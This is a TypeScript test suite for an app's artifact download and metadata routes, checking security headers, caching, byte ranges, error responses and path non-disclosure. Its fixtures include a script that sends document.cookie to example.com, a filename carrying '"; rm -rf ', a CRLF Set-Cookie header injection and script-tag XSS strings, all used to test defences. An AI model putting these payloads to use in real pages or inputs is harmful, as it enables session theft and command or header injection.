import { afterEach, describe, expect, it } from 'vitest';
import { createHash } from 'node:crypto';
import { rmSync } from 'node:fs';
import path from 'node:path';
import { Value } from '@sinclair/typebox/value';
import { ARTIFACT_CSP, ArtifactListResponseSchema, ArtifactViewSchema } from '@automate/core';
import { startArtifactApp, type ArtifactApp } from './support/artifact-app';

const apps: ArtifactApp[] = [];
afterEach(async () => { await Promise.all(apps.splice(0).map((app) => app.close())); });

async function start(...args: Parameters<typeof startArtifactApp>) {
  const app = await startArtifactApp(...args);
  apps.push(app);
  return app;
}

const REPORT = '<!doctype html><html><body><h1>Report</h1><script>fetch("https://example.com?d=" + document.cookie)</script></body></html>';
const HUNDRED_AND_MORE = 'x'.repeat(250);

/** Every byte-serving response must carry these, on every branch. */
function expectProtected(response: Response): void {
  expect(response.headers.get('content-security-policy')).toBe(ARTIFACT_CSP);
  expect(response.headers.get('x-content-type-options')).toBe('nosniff');
  expect(response.headers.get('cross-origin-resource-policy')).toBe('same-origin');
}

describe('artifact byte routes', () => {
  it('serves generated HTML inline with the CSP verbatim, nosniff, same-origin, and the digest as ETag', async () => {
    const app = await start({ 'report.html': REPORT }, [{ filename: 'report.html', type: 'html' }]);
    const [row] = await app.register();
    const response = await app.get(`/api/artifacts/${row!.id}/content`);
    expect(response.status).toBe(200);
    expectProtected(response);
    expect(response.headers.get('content-type')).toBe('text/html; charset=utf-8');
    expect(response.headers.get('content-disposition')).toBe(`inline; filename="report.html"; filename*=UTF-8''report.html`);
    expect(response.headers.get('etag')).toBe(`"${createHash('sha256').update(REPORT).digest('hex')}"`);
    expect(response.headers.get('cache-control')).toBe('private, max-age=0, must-revalidate');
    expect(response.headers.get('accept-ranges')).toBe('bytes');
    expect(await response.text()).toBe(REPORT);
  });

  it('serves the same bytes as an attachment from /download, with the same protection', async () => {
    const app = await start({ 'report.html': REPORT }, [{ filename: 'report.html', type: 'html' }]);
    const [row] = await app.register();
    const response = await app.get(`/api/artifacts/${row!.id}/download`);
    expectProtected(response);
    expect(response.headers.get('content-disposition')).toMatch(/^attachment; filename="report.html"/);
    expect(await response.text()).toBe(REPORT);
  });

  it('answers a matching If-None-Match with 304, no body, and the protective headers', async () => {
    const app = await start({ 'a.txt': 'hello' }, [{ filename: 'a.txt', type: 'text' }]);
    const [row] = await app.register();
    for (const route of ['content', 'download']) {
      const cached = await app.get(`/api/artifacts/${row!.id}/${route}`, { 'if-none-match': `"${row!.sha256}"` });
      expect(cached.status).toBe(304);
      expectProtected(cached);
      expect(await cached.text()).toBe('');
      const stale = await app.get(`/api/artifacts/${row!.id}/${route}`, { 'if-none-match': '"stale"' });
      expect(stale.status).toBe(200);
      expect(await stale.text()).toBe('hello');
    }
  });

  it('honours one byte range, answers a multi-range request with the full body, and refuses an unsatisfiable one', async () => {
    const app = await start({ 'big.txt': HUNDRED_AND_MORE }, [{ filename: 'big.txt', type: 'text' }]);
    const [row] = await app.register();
    const partial = await app.get(`/api/artifacts/${row!.id}/content`, { range: 'bytes=0-99' });
    expect(partial.status).toBe(206);
    expectProtected(partial);
    expect(partial.headers.get('content-range')).toBe('bytes 0-99/250');
    expect((await partial.arrayBuffer()).byteLength).toBe(100);
    const suffix = await app.get(`/api/artifacts/${row!.id}/content`, { range: 'bytes=-10' });
    expect([suffix.status, suffix.headers.get('content-range')]).toEqual([206, 'bytes 240-249/250']);
    await suffix.arrayBuffer();
    const multi = await app.get(`/api/artifacts/${row!.id}/content`, { range: 'bytes=0-0,5-9' });
    expect(multi.status).toBe(200);
    expect((await multi.text()).length).toBe(250);
    const beyond = await app.get(`/api/artifacts/${row!.id}/content`, { range: 'bytes=99999999-' });
    expect(beyond.status).toBe(416);
    expectProtected(beyond);
    expect(beyond.headers.get('content-range')).toBe('bytes */250');
  });

  it('returns the ARTIFACT_FILE_MISSING envelope, protected and correlated, when the file vanished behind the app', async () => {
    const app = await start({ 'a.csv': 'a\n1\n' }, [{ filename: 'a.csv', type: 'csv' }]);
    const [row] = await app.register();
    rmSync(path.join(app.fixture.store.root, ...row!.filePath.split('/')));
    for (const route of ['content', 'download']) {
      const response = await app.get(`/api/artifacts/${row!.id}/${route}`);
      expect(response.status).toBe(410);
      expectProtected(response);
      expect(response.headers.get('content-type')).toMatch(/^application\/json/);
      expect(response.headers.get('content-disposition')).toBeNull();
      const body = await response.json() as { error: { code: string; correlationId: string } };
      expect(body.error.code).toBe('ARTIFACT_FILE_MISSING');
      expect(body.error.correlationId).toBe(response.headers.get('x-correlation-id'));
    }
  });

  it('never serves a CSV holding markup as HTML, on any branch', async () => {
    const app = await start({ 'evil.csv': '<script>alert(1)</script>' }, [{ filename: 'evil.csv', type: 'csv' }]);
    const [row] = await app.register();
    const responses = [await app.get(`/api/artifacts/${row!.id}/content`), await app.get(`/api/artifacts/${row!.id}/download`), await app.get(`/api/artifacts/${row!.id}/content`, { range: 'bytes=0-5' })];
    for (const response of responses) {
      expect(response.headers.get('content-type')).toBe('text/csv; charset=utf-8');
      expect(response.headers.get('content-type')).not.toMatch(/html/);
      expectProtected(response);
      await response.arrayBuffer();
    }
  });

  it.each([
    ['"; rm -rf ', 'attachment; filename="__ rm -rf"; filename*=UTF-8\'\'__%20rm%20-rf'],
    ['résumé 日本.csv', `attachment; filename="r_sum_ __.csv"; filename*=UTF-8''r%C3%A9sum%C3%A9%20%E6%97%A5%E6%9C%AC.csv`],
  ])('writes a well-formed, non-injecting Content-Disposition for %j', async (name, expected) => {
    const safeOnDisk = name.includes('"') ? 'quoted.csv' : name;
    const app = await start({ [safeOnDisk]: 'a\n1\n' }, [{ filename: safeOnDisk, type: 'csv' }]);
    const [row] = await app.register();
    app.fixture.store.connection.client.prepare('UPDATE artifact SET filename = ? WHERE id = ?').run(name, row!.id);
    const response = await app.get(`/api/artifacts/${row!.id}/download`);
    expect(response.headers.get('content-disposition')).toBe(expected);
    await response.arrayBuffer();
  });

  it('keeps a CRLF in a stored filename out of the headers', async () => {
    const app = await start({ 'a.csv': 'a\n1\n' }, [{ filename: 'a.csv', type: 'csv' }]);
    const [row] = await app.register();
    app.fixture.store.connection.client.prepare('UPDATE artifact SET filename = ? WHERE id = ?').run('a\r\nSet-Cookie: x=1.csv', row!.id);
    const response = await app.get(`/api/artifacts/${row!.id}/download`);
    expect(response.status).toBe(200);
    expect(response.headers.get('set-cookie')).toBeNull();
    expect(response.headers.get('content-disposition')).toBe(`attachment; filename="aSet-Cookie_ x=1.csv"; filename*=UTF-8''aSet-Cookie_%20x%3D1.csv`);
    await response.arrayBuffer();
  });

  it.each(['0', '-1', 'abc', '1.5', '01'])('rejects the id %j with the validation envelope', async (id) => {
    const app = await start();
    const response = await app.get(`/api/artifacts/${id}/content`);
    expect(response.status).toBe(400);
    expectProtected(response);
    expect((await response.json() as { error: { code: string } }).error.code).toBe('VALIDATION_ERROR');
  });

  it('returns ARTIFACT_NOT_FOUND for an unknown id', async () => {
    const app = await start();
    for (const route of ['/api/artifacts/999', '/api/artifacts/999/content', '/api/artifacts/999/download', '/api/artifacts/999/rows', '/api/artifacts/999/preview']) {
      const response = await app.get(route);
      expect([route, response.status]).toEqual([route, 404]);
      expect((await response.json() as { error: { code: string } }).error.code).toBe('ARTIFACT_NOT_FOUND');
    }
  });
});

describe('artifact metadata routes', () => {
  it('lists a run with its counts and discrepancies, and never a filesystem location', async () => {
    const app = await start({ 'totals.csv': 'a\n1\n', 'extra.txt': 'x', 'bad.exe': 'MZ' }, [{ filename: 'totals.csv', type: 'csv', title: '<script>alert(1)</script>', description: 'By region' }, { filename: 'missing.png', type: 'image' }]);
    await app.register();
    const response = await app.get(`/api/executions/${app.fixture.executionId}/artifacts`);
    const text = await response.text();
    const body = JSON.parse(text);
    expect(Value.Check(ArtifactListResponseSchema, body)).toBe(true);
    expect(body).toMatchObject({ executionId: app.fixture.executionId, artifactCount: 2, unregisteredOutputCount: 1, declaredOutputCount: 2, producedOutputCount: 3, totalBytes: 5, archiveUrl: `/api/executions/${app.fixture.executionId}/artifacts/archive` });
    expect(body.artifacts.map((item: { filename: string; declared: boolean }) => [item.filename, item.declared])).toEqual([['totals.csv', true], ['extra.txt', false]]);
    expect(body.artifacts[0].title).toBe('<script>alert(1)</script>');
    expect(body.discrepancies.map((entry: { kind: string; count: number }) => [entry.kind, entry.count])).toEqual([['missing', 1], ['undeclared', 1], ['unregistered', 1]]);
    for (const secret of [app.fixture.store.root, app.fixture.store.root.replace(/\\/g, '\\\\'), 'runs/', 'file_path', 'filePath']) expect(text).not.toContain(secret);
    // `/api/artifacts/1/content` is a URL; `artifacts/<taskId>/<id>.csv` would be a location.
    expect(text).not.toMatch(/(?<!\/api\/)artifacts\/\d+\/\d+/);
  });

  it('describes one artifact by id', async () => {
    const app = await start({ 'a.csv': 'a\n=1\n' }, [{ filename: 'a.csv', type: 'csv' }]);
    const [row] = await app.register();
    const body = await (await app.get(`/api/artifacts/${row!.id}`)).json();
    expect(Value.Check(ArtifactViewSchema, body)).toBe(true);
    expect(body).toMatchObject({ id: row!.id, renderMode: 'table', contentUrl: `/api/artifacts/${row!.id}/content`, downloadUrl: `/api/artifacts/${row!.id}/download`, contentScan: { formulaCellCount: 1 } });
    expect(JSON.stringify(body)).not.toContain(app.fixture.store.root.replace(/\\/g, '\\\\'));
  });

  it('lists an execution that has not run yet as empty, and an unknown execution as not found', async () => {
    const app = await start();
    const empty = await (await app.get(`/api/executions/${app.fixture.executionId}/artifacts`)).json();
    expect(empty).toMatchObject({ artifacts: [], artifactCount: null, archiveUrl: null, discrepancies: [] });
    const missing = await app.get('/api/executions/999/artifacts');
    expect(missing.status).toBe(404);
    expect((await missing.json() as { error: { code: string } }).error.code).toBe('EXECUTION_NOT_FOUND');
  });
});
